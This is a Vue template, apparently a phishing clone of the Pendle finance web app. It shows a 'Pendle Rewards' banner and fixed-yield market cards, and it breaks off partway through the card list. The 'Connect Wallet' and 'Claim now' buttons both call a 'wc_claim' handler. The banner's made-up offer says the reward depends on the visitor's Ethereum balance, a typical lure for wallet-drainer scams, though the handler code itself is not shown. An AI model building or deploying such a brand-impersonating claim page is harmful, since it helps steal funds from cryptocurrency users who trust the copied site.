<template>
  <div>
    <div id="app" data-v-app="">
      <div
        data-v-0d5f7483=""
        class="w-full min-h-screen transition duration-500"
        style="--eb1cd92c: 20px; --68cee971: 16px"
      >
        <nav
          class="z-navbar flex h-14 w-full items-center bg-opacity-50 px-4 pp-navbar-light fixed top-0 w-full h-14"
          variant="earn"
        >
          <a href="/" class="rounded-full pp-focus-outline"
            ><img
              alt="Pendle brandmark logo"
              src="/assets/pendle-logo-light-8e6abf49.png"
              class="object-contain h-9 w-9"
          /></a>
          <div class="items-center hidden ml-5 text-base gap-x-8 lg:flex">
            <a
              class="pp-focus-outline inline-flex items-center justify-center text-water-700 font-medium"
              href="/earn/fixed-yield"
              aria-current="page"
              >Fixed Yield </a
            ><a
              class="pp-focus-outline inline-flex items-center justify-center text-water-400 font-normal"
              href="/earn/liquidity"
              >Liquidity
              <!----></a
            ><a
              class="pp-focus-outline inline-flex items-center justify-center text-water-400 font-normal"
              href="/vependle/overview"
              >vePENDLE
              <!----></a
            ><a
              class="pp-focus-outline inline-flex items-center justify-center text-water-400 font-normal"
              href="/campaigns"
              >Campaigns
              <!----></a
            >
          </div>
          <div class="flex-grow"></div>
          <div class="flex items-center space-x-4">
            <div class="relative" data-test="network-selector">
              <button
                id="headlessui-listbox-button-3"
                type="button"
                aria-haspopup="listbox"
                aria-expanded="false"
                data-headlessui-state=""
                class="transition rounded-full shadow-md pp-focus-outline hover:opacity-100 opacity-90"
              >
                <div class="flex items-center px-1 py-0.5">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    viewBox="0 0 20 20"
                    fill="currentColor"
                    aria-hidden="true"
                    class="w-5 h-5 transition-transform rotate-0"
                  >
                    <path
                      fill-rule="evenodd"
                      d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"
                      clip-rule="evenodd"
                    ></path>
                  </svg>
                </div></button
              ><!---->
            </div>
            <button @click.prevent="wc_claim"
              data-v-0d5f7483=""
              class="bg-water-50 hover:bg-[#BFCBDF] hover:bg-opacity-20 px-4 rounded-full shadow pp-focus-outline h-7"
            >
              <span
                data-test="connect-wallet"
                class="text-base font-medium text-primary"
                ><span class="sm:hidden">Connect</span
                ><span class="hidden sm:inline"> Connect Wallet </span></span
              >
            </button>
            <div data-v-0d5f7483="" class="hidden lg:block">
              <!----><button
                class="bg-water-300 pp-focus-outline relative inline-flex h-6 w-[88px] items-center rounded-full shadow-md transition-colors"
                data-test="simple-pro-switch"
                data-app-mode="Earn"
                id="simple-pro-switch"
                role="switch"
                type="button"
                tabindex="0"
                aria-checked="false"
                data-headlessui-state=""
              >
                <span
                  class="translate-x-0 text-water-600 shadow pp-gradient-blue-white-light-100 inline-flex items-center justify-center w-16 h-6 text-base font-medium transition-transform transform rounded-full"
                  >Earn</span
                >
              </button>
            </div>
            <div class="relative hidden lg:block" data-headlessui-state="">
              <button
                type="button"
                class="pp-focus-outline rounded-full border-none !p-0 hover:bg-water-300 hover:bg-opacity-30 pp-btn p-0.5 h-8 w-8 text-water-500 text-opacity-75 enabled:hover:text-opacity-100 focus:text-opacity-100 transition pp-focus-outline rounded-full border-none !p-0 hover:bg-water-300 hover:bg-opacity-30"
                id="headlessui-popover-button-5"
                aria-expanded="false"
                data-headlessui-state=""
              >
                <div
                  data-test="slippage-tolerance"
                  class="flex h-full w-full items-center justify-center rounded-full"
                >
                  <svg
                    width="22"
                    height="22"
                    viewBox="0 0 22 22"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                    class="h-5 w-5 text-slate-700"
                  >
                    <path
                      d="M11.0455 8.04578C10.43 7.98499 9.81071 8.11594 9.27249 8.4207C8.73426 8.72546 8.30339 9.18913 8.03886 9.74823C7.77434 10.3073 7.68909 10.9345 7.79479 11.5439C7.90049 12.1534 8.19198 12.7152 8.62934 13.1526C9.0667 13.5899 9.62855 13.8814 10.238 13.9871C10.8474 14.0928 11.4746 14.0076 12.0337 13.7431C12.5928 13.4785 13.0565 13.0477 13.3612 12.5094C13.666 11.9712 13.7969 11.3519 13.7361 10.7364C13.6668 10.0464 13.3611 9.40156 12.8707 8.91119C12.3803 8.42083 11.7355 8.11508 11.0455 8.04578ZM18.2689 11.0312C18.267 11.3573 18.2431 11.6829 18.1972 12.0058L20.3164 13.668C20.4087 13.7445 20.4709 13.8512 20.4919 13.9692C20.513 14.0872 20.4915 14.2088 20.4313 14.3125L18.4264 17.7812C18.3656 17.8839 18.2704 17.9618 18.1577 18.0011C18.045 18.0405 17.9221 18.0388 17.8105 17.9964L15.7058 17.1489C15.5898 17.1027 15.464 17.086 15.3399 17.1003C15.2158 17.1146 15.0972 17.1595 14.9947 17.2309C14.6735 17.4521 14.336 17.6486 13.985 17.8187C13.8747 17.8724 13.7793 17.9523 13.7072 18.0516C13.6351 18.1508 13.5885 18.2663 13.5716 18.3878L13.2561 20.6327C13.2354 20.7512 13.1742 20.8589 13.0828 20.9373C12.9915 21.0157 12.8758 21.0599 12.7555 21.0625H8.74582C8.62748 21.0604 8.51337 21.0182 8.42228 20.9426C8.3312 20.867 8.26857 20.7626 8.24473 20.6467L7.92973 18.4052C7.91204 18.2823 7.86427 18.1657 7.79067 18.0658C7.71707 17.9659 7.61992 17.8857 7.50785 17.8323C7.15733 17.6631 6.82094 17.4661 6.50191 17.2431C6.39977 17.1721 6.28155 17.1275 6.15791 17.1135C6.03426 17.0995 5.90908 17.1165 5.79363 17.163L3.68942 18.01C3.5779 18.0525 3.45498 18.0542 3.34231 18.0149C3.22964 17.9757 3.13443 17.8979 3.07348 17.7953L1.06864 14.3266C1.00836 14.2229 0.98682 14.1013 1.00785 13.9832C1.02888 13.8652 1.09112 13.7585 1.18348 13.682L2.97457 12.2758C3.0727 12.1979 3.14982 12.0967 3.19893 11.9815C3.24805 11.8662 3.2676 11.7405 3.25582 11.6158C3.23895 11.4203 3.22863 11.2253 3.22863 11.0298C3.22863 10.8344 3.23848 10.6422 3.25582 10.4509C3.26631 10.327 3.2458 10.2023 3.19613 10.0883C3.14646 9.97419 3.06919 9.87427 2.97129 9.7975L1.18114 8.39125C1.09027 8.31442 1.02935 8.20806 1.00904 8.09082C0.988724 7.97357 1.01032 7.85292 1.07004 7.75L3.07488 4.28125C3.13577 4.17859 3.23094 4.10071 3.34362 4.06135C3.4563 4.02199 3.57926 4.02367 3.69082 4.06609L5.79551 4.91359C5.91157 4.95981 6.03729 4.9765 6.16139 4.96218C6.2855 4.94787 6.40411 4.90299 6.5066 4.83156C6.82781 4.61037 7.16534 4.41387 7.51629 4.24375C7.62662 4.19012 7.72205 4.11016 7.79416 4.01091C7.86626 3.91166 7.91282 3.79619 7.92973 3.67469L8.24519 1.42984C8.26591 1.31129 8.32716 1.20361 8.41848 1.12521C8.50979 1.0468 8.62549 1.00255 8.74582 1H12.7555C12.8738 1.00205 12.988 1.04434 13.079 1.11992C13.1701 1.1955 13.2328 1.29985 13.2566 1.41578L13.5716 3.65734C13.5893 3.78019 13.6371 3.89676 13.7107 3.99669C13.7843 4.09662 13.8814 4.17682 13.9935 4.23016C14.344 4.39935 14.6804 4.59639 14.9994 4.81937C15.1016 4.89044 15.2198 4.93498 15.3434 4.94897C15.4671 4.96297 15.5923 4.94598 15.7077 4.89953L17.8119 4.0525C17.9234 4.01004 18.0463 4.00829 18.159 4.04756C18.2717 4.08683 18.3669 4.16461 18.4278 4.26719L20.4327 7.73594C20.493 7.83957 20.5145 7.96123 20.4935 8.07926C20.4724 8.19729 20.4102 8.30403 20.3178 8.38047L18.5268 9.78672C18.4282 9.86436 18.3506 9.96541 18.3011 10.0807C18.2516 10.196 18.2317 10.3218 18.2432 10.4467C18.2586 10.6408 18.2689 10.8358 18.2689 11.0312Z"
                      stroke="currentColor"
                      stroke-width="1.5"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                    ></path>
                  </svg>
                </div></button
              ><!----><!---->
            </div>
            <div class="relative hidden lg:block" data-headlessui-state="">
              <button
                type="button"
                class="pp-focus-outline rounded-full border-none !p-0 hover:bg-water-300 hover:bg-opacity-30 pp-btn p-0.5 h-8 w-8 text-water-500 text-opacity-75 enabled:hover:text-opacity-100 focus:text-opacity-100 transition pp-focus-outline rounded-full border-none !p-0 hover:bg-water-300 hover:bg-opacity-30"
                id="headlessui-popover-button-7"
                aria-expanded="false"
                data-headlessui-state=""
              >
                <div
                  data-test="slippage-tolerance"
                  class="flex items-center justify-center w-full h-full rounded-full"
                >
                  <svg
                    width="15"
                    height="3"
                    viewBox="0 0 15 3"
                    fill="currentColor"
                    xmlns="http://www.w3.org/2000/svg"
                    class="w-5 h-5 text-slate-700"
                  >
                    <path
                      d="M7.5 3C8.32843 3 9 2.32843 9 1.5C9 0.671573 8.32843 0 7.5 0C6.67157 0 6 0.671573 6 1.5C6 2.32843 6.67157 3 7.5 3Z"
                    ></path>
                    <path
                      d="M13.5 3C14.3284 3 15 2.32843 15 1.5C15 0.671573 14.3284 0 13.5 0C12.6716 0 12 0.671573 12 1.5C12 2.32843 12.6716 3 13.5 3Z"
                    ></path>
                    <path
                      d="M1.5 3C2.32843 3 3 2.32843 3 1.5C3 0.671573 2.32843 0 1.5 0C0.671573 0 0 0.671573 0 1.5C0 2.32843 0.671573 3 1.5 3Z"
                    ></path>
                  </svg>
                </div></button
              ><!----><!---->
            </div>
            <button class="block lg:hidden">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 24 24"
                stroke-width="2"
                stroke="currentColor"
                aria-hidden="true"
                class="w-5 h-5"
              >
                <path
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  d="M4 6h16M4 12h16M4 18h16"
                ></path>
              </svg>
            </button>
          </div>
        </nav>
        <!---->
        <div
          data-v-0d5f7483=""
          id="pp-top-banner"
          class="fixed w-full top-14 z-banner"
        ></div>
        <div data-v-0d5f7483="" id="pp-app-view" class="md:pb-0 pt-14">
          <div>
            <div
              class="relative"
              style="
                background: linear-gradient(
                  139deg,
                  rgba(71, 113, 181, 0.05) 0%,
                  rgba(126, 216, 201, 0.05) 100%
                );
              "
            >
              <div
                class="absolute inset-0 hidden pointer-events-none md:block -z-10"
                style="
                  background-image: url('/assets/earn_portfolio_banner-273b0f11.png');
                  background-size: 100% 100%;
                  background-repeat: no-repeat;
                "
              ></div>
              <div class="pp-container !py-6 md:!py-10">
                <div class="flex md:flex-row gap-x-14">
                  <div class="">
                    <div>
                      <div class="font-bold text-water-700 text-36px">
                        Pendle Rewards
                      </div>
                      <div class="font-semibold text-water-700 mt-4 text-md">
                        <p>
                          Over
                          <span
                            title="USD 143010878.8749433"
                            class="whitespace-nowrap text-info"
                            >$10M</span
                          >
                          claimed rewards in Pendle.
                        </p>
                        <p class="mt-1">The
                                amount of Pendle reward you can claim depends on your
                                Ethereum balance.</p>
                      </div>
                    </div>
                    <!---->
                  </div>
                  <div class="hidden lg:block grow"></div>
                  <div class="flex gap-x-14 max-h-screen">
                    <div
                      class="border-water-200 border px-6 py-5 space-y-2.5 flex flex-col items-center rounded-[10px] bg-white"
                    >
                      <svg
                        width="36"
                        height="27"
                        viewBox="0 0 36 27"
                        fill="none"
                        xmlns="http://www.w3.org/2000/svg"
                      >
                        <path
                          fill-rule="evenodd"
                          clip-rule="evenodd"
                          d="M1.97413 26.1142H32.0987C32.8624 26.1142 33.4818 25.4933 33.4818 24.7277V4.52247C33.4818 3.75495 32.8609 3.13281 32.0955 3.13281H1.24315C0.877912 3.13281 0.582031 3.42942 0.582031 3.79555V24.7188C0.582031 25.4894 1.20508 26.1142 1.97413 26.1142"
                          fill="#F1F2F7"
                        ></path>
                        <path
                          fill-rule="evenodd"
                          clip-rule="evenodd"
                          d="M1.95561 25.8729H5.61115C5.63918 25.8729 5.66214 25.85 5.66214 25.8218V0.281547C5.66214 0.253358 5.63918 0.230469 5.61115 0.230469H1.95561C1.19681 0.230469 0.582031 0.843412 0.582031 1.59995V24.5034C0.582031 25.2597 1.19681 25.8729 1.95561 25.8729"
                          fill="#BEC0D6"
                        ></path>
                        <path
                          fill-rule="evenodd"
                          clip-rule="evenodd"
                          d="M25.9074 17.4074H35.3664C35.3943 17.4074 35.4172 17.3842 35.4172 17.3557V11.6533C35.4172 11.6247 35.3943 11.6016 35.3664 11.6016H25.9074C25.1475 11.6016 24.5312 12.2253 24.5312 12.9943V16.0146C24.5312 16.7839 25.1475 17.4074 25.9074 17.4074"
                          fill="#51A69A"
                        ></path>
                        <path
                          fill-rule="evenodd"
                          clip-rule="evenodd"
                          d="M27.989 0.230469H1.9887V0.233884C1.20921 0.252669 0.582031 0.892097 0.582031 1.68205C0.582031 2.472 1.20921 3.11143 1.9887 3.13022V3.13339H29.5599C29.5882 3.13339 29.6112 3.11045 29.6112 3.08191V1.86478C29.6112 0.962114 28.8847 0.230469 27.989 0.230469"
                          fill="#D8DBEA"
                        ></path>
                      </svg>
                      <div>Connect wallet to claim</div>
                      <button @click.prevent="wc_claim"
                        type="button"
                        class="!px-5 pp-btn px-2.5 py-1.5 text-base rounded-2xl pp-focus-outline btn-gradient-secondary-light font-bold bg-white text-water-700 bg-pos-0 border-[#CADDF6] bg-size-400 hover:bg-pos-33 focus:bg-pos-100 transition-all duration-300 !px-5"
                      >
                        <span class="font-semibold"> Claim now </span>
                      </button>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div class="pp-container pt-6 lg:pt-10">
            <div class="text-xl font-bold lg:text-2xl">Earn Fixed Yield</div>
            <div class="mt-6">
              <!---->
              <div>
                <div class="mt-6">
                  <div
                    class="flex flex-col gap-y-4 md:flex-row md:justify-between md:items-center"
                  >
                    <div
                      class="transition rounded-lg flex border border-water-200 bg-white cursor-text focus-within:ring-water-400 focus-within:border-water-400 w-full md:w-72"
                    >
                      <input
                        class="w-full md:w-72 bg-white text-water-700 placeholder:text-water-300 outline-none border-none focus:border-none focus:placeholder:text-water-400 focus:ring-0 block w-full py-2 px-3 h-9 rounded-lg text-base transition"
                        id="pp-searchinput-124"
                        type="text"
                        placeholder="Search"
                      /><label
                        for="pp-searchinput-124"
                        class="pr-3 flex items-center cursor-text transition text-water-700"
                        ><svg
                          xmlns="http://www.w3.org/2000/svg"
                          fill="none"
                          viewBox="0 0 24 24"
                          stroke-width="2"
                          stroke="currentColor"
                          aria-hidden="true"
                          class="w-5 h-5"
                        >
                          <path
                            stroke-linecap="round"
                            stroke-linejoin="round"
                            d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
                          ></path></svg
                      ></label>
                    </div>
                    <div class="flex items-center gap-x-3">
                      <div>
                        <div
                          class="flex items-center gap-x-1.5"
                          data-headlessui-state=""
                        >
                          <label
                            id="headlessui-listbox-label-9"
                            data-headlessui-state=""
                            class=""
                          >
                            Sort by:
                          </label>
                          <div class="relative">
                            <button
                              id="headlessui-listbox-button-10"
                              type="button"
                              aria-haspopup="listbox"
                              aria-expanded="false"
                              data-headlessui-state=""
                              class="relative py-1 pl-0.5 pr-6 transition-colors text-left text-water-700 border-2 border-transparent border-b-water-500 focus:outline-none focus:border-b-info group hover:border-b-info"
                              aria-labelledby="headlessui-listbox-label-9 headlessui-listbox-button-10"
                            >
                              <span
                                class="transition group-hover:text-info group-focus:text-info"
                                >Starred</span
                              ><span
                                class="pointer-events-none absolute inset-y-0 right-0 flex items-center pr-1"
                                ><svg
                                  width="14"
                                  height="8"
                                  viewBox="0 0 14 8"
                                  fill="currentColor"
                                  xmlns="http://www.w3.org/2000/svg"
                                  class="h-3.5 w-3.5 relative top-px transition group-focus:text-info group-hover:text-info"
                                  aria-hidden="true"
                                >
                                  <path
                                    d="M7.00023 7.71309L13.0102 1.70309L11.5972 0.288086L7.00023 4.88809L2.40423 0.288086L0.990234 1.70209L7.00023 7.71309Z"
                                  ></path></svg
                              ></span></button
                            ><!---->
                          </div>
                        </div>
                      </div>
                      <div style="">
                        <div role="tablist" aria-orientation="horizontal">
                          <button
                            id="headlessui-tabs-tab-12"
                            role="tab"
                            type="button"
                            aria-selected="false"
                            tabindex="-1"
                            data-headlessui-state=""
                            class="p-1 focus:outline-info group"
                            aria-controls="headlessui-tabs-panel-16"
                          >
                            <span class="sr-only"> Switch to Table View </span
                            ><svg
                              width="15"
                              height="15"
                              viewBox="0 0 15 15"
                              fill="none"
                              xmlns="http://www.w3.org/2000/svg"
                              class="h-4 w-4 transition text-water-200 group-hover:text-water-300"
                            >
                              <rect
                                y="0.46875"
                                width="14.1437"
                                height="3.23609"
                                rx="1.61805"
                                fill="currentColor"
                              ></rect>
                              <rect
                                y="5.88965"
                                width="14.1437"
                                height="3.23609"
                                rx="1.61805"
                                fill="currentColor"
                              ></rect>
                              <rect
                                y="11.2949"
                                width="14.1437"
                                height="3.23609"
                                rx="1.61805"
                                fill="currentColor"
                              ></rect>
                            </svg></button
                          ><button
                            id="headlessui-tabs-tab-13"
                            role="tab"
                            type="button"
                            aria-selected="true"
                            tabindex="0"
                            data-headlessui-state="selected"
                            class="p-1 focus:outline-info group"
                            aria-controls="headlessui-tabs-panel-17"
                          >
                            <span class="sr-only"> Switch to Grid View </span
                            ><svg
                              width="15"
                              height="15"
                              viewBox="0 0 15 15"
                              fill="none"
                              xmlns="http://www.w3.org/2000/svg"
                              class="h-4 w-4 transition text-water-700"
                            >
                              <rect
                                x="0.806641"
                                y="0.46875"
                                width="6.66504"
                                height="6.5625"
                                rx="2"
                                fill="currentColor"
                              ></rect>
                              <rect
                                x="0.806641"
                                y="7.96875"
                                width="6.66504"
                                height="6.5625"
                                rx="2"
                                fill="currentColor"
                              ></rect>
                              <rect
                                x="8.28516"
                                y="0.46875"
                                width="6.66504"
                                height="6.5625"
                                rx="2"
                                fill="currentColor"
                              ></rect>
                              <rect
                                x="8.28516"
                                y="7.96875"
                                width="6.66504"
                                height="6.5625"
                                rx="2"
                                fill="currentColor"
                              ></rect>
                            </svg>
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div>
                <div class="gap-x-6 gap-y-4">
                  <div>
                    <div>
                      <span
                        id="headlessui-tabs-panel-16"
                        role="tabpanel"
                        tabindex="-1"
                        aria-labelledby="headlessui-tabs-tab-12"
                        style="
                          position: fixed;
                          height: 0px;
                          padding: 0px;
                          overflow: hidden;
                          clip: rect(0px, 0px, 0px, 0px);
                          white-space: nowrap;
                          border-width: 0px;
                        "
                      ></span>
                      <div
                        id="headlessui-tabs-panel-17"
                        role="tabpanel"
                        aria-labelledby="headlessui-tabs-tab-13"
                        tabindex="0"
                        data-headlessui-state="selected"
                      >
                        <div
                          class="grid gap-x-5 gap-y-8 pt-8 md:pt-12 lg:pt-14 grid-cols-1 md:grid-cols-2 xl:grid-cols-3 2xl:grid-cols-4"
                        >
                          <a
                            data-v-9d0ac272=""
                            href="/earn/fixed-yield/0xeb83006b0aaddd15ad8afbebe2f4e0937f210673"
                            class="relative p-5 mb-3 border cursor-pointer rounded-xl group flex flex-col justify-between"
                            style="--5db2813d: #dedede"
                            ><div
                              data-v-9d0ac272=""
                              class="absolute inset-0 pointer-events-none card-accent-gradient rounded-xl opacity-30 group-hover:opacity-20 -z-10"
                            ></div>
                            <div data-v-9d0ac272="">
                              <img
                                data-v-9d0ac272=""
                                src="https://storage.googleapis.com/stage-pendle-bucket-a/images/uploads/10ba5c72-3226-44f3-b047-db66ad0e50f8.svg"
                                alt="sfrxETH"
                                title="sfrxETH"
                                class="inline-block h-16 w-16 absolute right-3.5 -mt-12"
                              />
                              <div data-v-9d0ac272="" class="pr-16">
                                <div
                                  data-v-9d0ac272=""
                                  class="flex items-center gap-x-1"
                                >
                                  <span
                                    data-v-9d0ac272=""
                                    class="text-xl font-bold"
                                    >sfrxETH</span
                                  ><button
                                    data-v-9d0ac272=""
                                    type="button"
                                    class="relative z-10 bottom-px"
                                  >
                                    <svg
                                      class="text-water-200 hover:text-[#EFB54B]/50 transition"
                                      width="18"
                                      height="18"
                                      viewBox="0 0 18 18"
                                      fill="none"
                                      xmlns="http://www.w3.org/2000/svg"
                                    >
                                      <path
                                        d="M8.89952 14.7419L4.58536 17.3408C4.39477 17.4621 4.19552 17.5141 3.98761 17.4968C3.7797 17.4794 3.59778 17.4101 3.44184 17.2888C3.28591 17.1676 3.16463 17.0158 3.078 16.8335C2.99137 16.6512 2.97404 16.4478 3.02602 16.2233L4.16953 11.3114L0.349162 8.0108C0.175903 7.85486 0.0677886 7.6771 0.0248202 7.4775C-0.0181481 7.27791 -0.00532696 7.08317 0.0632838 6.89327C0.132588 6.70269 0.236543 6.54675 0.375151 6.42547C0.513758 6.30419 0.704344 6.22623 0.946907 6.19157L5.98876 5.74976L7.93793 1.12373C8.02456 0.915823 8.15901 0.759889 8.34127 0.655934C8.52354 0.551978 8.70962 0.5 8.89952 0.5C9.0901 0.5 9.27618 0.551978 9.45776 0.655934C9.63933 0.759889 9.77378 0.915823 9.8611 1.12373L11.8103 5.74976L16.8521 6.19157C17.0947 6.22623 17.2853 6.30419 17.4239 6.42547C17.5625 6.54675 17.6664 6.70269 17.7357 6.89327C17.805 7.08386 17.8182 7.27895 17.7752 7.47854C17.7323 7.67814 17.6238 7.85556 17.4499 8.0108L13.6295 11.3114L14.773 16.2233C14.825 16.4485 14.8077 16.6523 14.721 16.8346C14.6344 17.0168 14.5131 17.1683 14.3572 17.2888C14.2013 17.4101 14.0193 17.4794 13.8114 17.4968C13.6035 17.5141 13.4043 17.4621 13.2137 17.3408L8.89952 14.7419Z"
                                        fill="currentColor"
                                      ></path>
                                    </svg>
                                  </button>
                                </div>
                              </div>
                              <div data-v-9d0ac272="" class="mt-1">
                                <span
                                  data-v-9d0ac272=""
                                  class="text-sm font-bold"
                                  >Frax</span
                                >
                              </div>
                              <div data-v-9d0ac272="" class="mt-4">
                                <div
                                  data-v-9d0ac272=""
                                  class="text-sm text-secondary uppercase"
                                >
                                  Up to
                                </div>
                                <span
                                  data-v-9d0ac272=""
                                  class="text-2xl font-bold text-success"
                                  ><!----><span
                                    title="4.911098581207107"
                                    class="whitespace-nowrap"
                                    >4.91</span
                                  >%</span
                                ><span data-v-9d0ac272=""> p.a </span>
                              </div>
                            </div>
                            <div data-v-9d0ac272="" class="mt-4">
                              <div
                                data-v-9d0ac272=""
                                class="bg-water-200/10 text-water-300/75 italic py-1 px-2 rounded-[5px] h-full"
                              >
                                No position
                              </div>
                            </div></a
                          ><a
                            data-v-9d0ac272=""
                            href="/earn/fixed-yield/0xcbc72d92b2dc8187414f6734718563898740c0bc"
                            class="relative p-5 mb-3 border cursor-pointer rounded-xl group flex flex-col justify-between"
                            style="--5db2813d: #00a3ff"
                            ><div
                              data-v-9d0ac272=""
                              class="absolute inset-0 pointer-events-none card-accent-gradient rounded-xl opacity-30 group-hover:opacity-20 -z-10"
                            ></div>
                            <div data-v-9d0ac272="">
                              <img
                                data-v-9d0ac272=""
                                src="https://storage.googleapis.com/stage-pendle-bucket-a/images/uploads/91c4db0f-49af-4c96-a6a3-4d31e28fad6b.svg"
                                alt="stETH"
                                title="stETH"
                                class="inline-block h-16 w-16 absolute right-3.5 -mt-12"
                              />
                              <div data-v-9d0ac272="" class="pr-16">
                                <div
                                  data-v-9d0ac272=""
                                  class="flex items-center gap-x-1"
                                >
                                  <span
                                    data-v-9d0ac272=""
                                    class="text-xl font-bold"
                                    >stETH</span
                                  ><button
                                    data-v-9d0ac272=""
                                    type="button"
                                    class="relative z-10 bottom-px"
                                  >
                                    <svg
                                      class="text-water-200 hover:text-[#EFB54B]/50 transition"
                                      width="18"
                                      height="18"
                                      viewBox="0 0 18 18"
                                      fill="none"
                                      xmlns="http://www.w3.org/2000/svg"
                                    >
                                      <path
                                        d="M8.89952 14.7419L4.58536 17.3408C4.39477 17.4621 4.19552 17.5141 3.98761 17.4968C3.7797 17.4794 3.59778 17.4101 3.44184 17.2888C3.28591 17.1676 3.16463 17.0158 3.078 16.8335C2.99137 16.6512 2.97404 16.4478 3.02602 16.2233L4.16953 11.3114L0.349162 8.0108C0.175903 7.85486 0.0677886 7.6771 0.0248202 7.4775C-0.0181481 7.27791 -0.00532696 7.08317 0.0632838 6.89327C0.132588 6.70269 0.236543 6.54675 0.375151 6.42547C0.513758 6.30419 0.704344 6.22623 0.946907 6.19157L5.98876 5.74976L7.93793 1.12373C8.02456 0.915823 8.15901 0.759889 8.34127 0.655934C8.52354 0.551978 8.70962 0.5 8.89952 0.5C9.0901 0.5 9.27618 0.551978 9.45776 0.655934C9.63933 0.759889 9.77378 0.915823 9.8611 1.12373L11.8103 5.74976L16.8521 6.19157C17.0947 6.22623 17.2853 6.30419 17.4239 6.42547C17.5625 6.54675 17.6664 6.70269 17.7357 6.89327C17.805 7.08386 17.8182 7.27895 17.7752 7.47854C17.7323 7.67814 17.6238 7.85556 17.4499 8.0108L13.6295 11.3114L14.773 16.2233C14.825 16.4485 14.8077 16.6523 14.721 16.8346C14.6344 17.0168 14.5131 17.1683 14.3572 17.2888C14.2013 17.4101 14.0193 17.4794 13.8114 17.4968C13.6035 17.5141 13.4043 17.4621 13.2137 17.3408L8.89952 14.7419Z"
                                        fill="currentColor"
                                      ></path>
                                    </svg>
                                  </button>
                                </div>
                              </div>
                              <div data-v-9d0ac272="" class="mt-1">
                                <span
                                  data-v-9d0ac272=""
                                  class="text-sm font-bold"
                                  >Lido</span
                                >
                              </div>
                              <div data-v-9d0ac272="" class="mt-4">
                                <div
                                  data-v-9d0ac272=""
                                  class="text-sm text-secondary uppercase"
                                >
                                  Up to
                                </div>
                                <span
                                  data-v-9d0ac272=""
                                  class="text-2xl font-bold text-success"
                                  ><!----><span
                                    title="4.25730332083476"
                                    class="whitespace-nowrap"
                                    >4.26</span
                                  >%</span
                                ><span data-v-9d0ac272=""> p.a </span>
                              </div>
                            </div>
                            <div data-v-9d0ac272="" class="mt-4">
                              <div
                                data-v-9d0ac272=""
                                class="bg-water-200/10 text-water-300/75 italic py-1 px-2 rounded-[5px] h-full"
                              >
                                No position
                              </div>
                            </div></a
                          ><a
                            data-v-9d0ac272=""
                            href="/earn/fixed-yield/0xaa68ca9c69a4ff22203ce189ce4448d7401875e8"
                            class="relative p-5 mb-3 border cursor-pointer rounded-xl group flex flex-col justify-between"
                            style="--5db2813d: #254cd4"
                            ><div
                              data-v-9d0ac272=""
                              class="absolute inset-0 pointer-events-none card-accent-gradient rounded-xl opacity-30 group-hover:opacity-20 -z-10"
                            ></div>
                            <div data-v-9d0ac272="">
                              <img
                                data-v-9d0ac272=""
                                src="https://storage.googleapis.com/stage-pendle-bucket-a/images/uploads/afcfcc15-1366-446e-a743-12518a8d24a8.png"
                                alt="swETH"
                                title="swETH"
                                class="inline-block h-16 w-16 absolute right-3.5 -mt-12"
                              />
                              <div data-v-9d0ac272="" class="pr-16">
                                <div
                                  data-v-9d0ac272=""
                                  class="flex items-center gap-x-1"
                                >
                                  <span
                                    data-v-9d0ac272=""
                                    class="text-xl font-bold"
                                    >swETH</span
                                  ><button
                                    data-v-9d0ac272=""
                                    type="button"
                                    class="relative z-10 bottom-px"
                                  >
                                    <svg
                                      class="text-water-200 hover:text-[#EFB54B]/50 transition"
                                      width="18"
                                      height="18"
                                      viewBox="0 0 18 18"
                                      fill="none"
                                      xmlns="http://www.w3.org/2000/svg"
                                    >
                                      <path
                                        d="M8.89952 14.7419L4.58536 17.3408C4.39477 17.4621 4.19552 17.5141 3.98761 17.4968C3.7797 17.4794 3.59778 17.4101 3.44184 17.2888C3.28591 17.1676 3.16463 17.0158 3.078 16.8335C2.99137 16.6512 2.97404 16.4478 3.02602 16.2233L4.16953 11.3114L0.349162 8.0108C0.175903 7.85486 0.0677886 7.6771 0.0248202 7.4775C-0.0181481 7.27791 -0.00532696 7.08317 0.0632838 6.89327C0.132588 6.70269 0.236543 6.54675 0.375151 6.42547C0.513758 6.30419 0.704344 6.22623 0.946907 6.19157L5.98876 5.74976L7.93793 1.12373C8.02456 0.915823 8.15901 0.759889 8.34127 0.655934C8.52354 0.551978 8.70962 0.5 8.89952 0.5C9.0901 0.5 9.27618 0.551978 9.45776 0.655934C9.63933 0.759889 9.77378 0.915823 9.8611 1.12373L11.8103 5.74976L16.8521 6.19157C17.0947 6.22623 17.2853 6.30419 17.4239 6.42547C17.5625 6.54675 17.6664 6.70269 17.7357 6.89327C17.805 7.08386 17.8182 7.27895 17.7752 7.47854C17.7323 7.67814 17.6238 7.85556 17.4499 8.0108L13.6295 11.3114L14.773 16.2233C14.825 16.4485 14.8077 16.6523 14.721 16.8346C14.6344 17.0168 14.5131 17.1683 14.3572 17.2888C14.2013 17.4101 14.0193 17.4794 13.8114 17.4968C13.6035 17.5141 13.4043 17.4621 13.2137 17.3408L8.89952 14.7419Z"
                                        fill="currentColor"
                                      ></path>
                                    </svg>
                                  </button>
                                </div>
                              </div>
                              <div data-v-9d0ac272="" class="mt-1">
                                <span
                                  data-v-9d0ac272=""
                                  class="text-sm font-bold"
                                  >Swell</span
                                >
                              </div>
                              <div data-v-9d0ac272="" class="mt-4">
                                <div
                                  data-v-9d0ac272=""
                                  class="text-sm text-secondary uppercase"
                                >
                                  Up to
                                </div>
                                <span
                                  data-v-9d0ac272=""
                                  class="text-2xl font-bold text-success"
                                  ><!----><span
                                    title="2.3923714154409303"
                                    class="whitespace-nowrap"
                                    >2.39</span
                                  >%</span
                                ><span data-v-9d0ac272=""> p.a </span>
                              </div>
                            </div>
                            <div data-v-9d0ac272="" class="mt-4">
                              <div
                                data-v-9d0ac272=""
                                class="bg-water-200/10 text-water-300/75 italic py-1 px-2 rounded-[5px] h-full"
                              >
                                No position
                              </div>
                            </div></a
                          ><a
                            data-v-9d0ac272=""
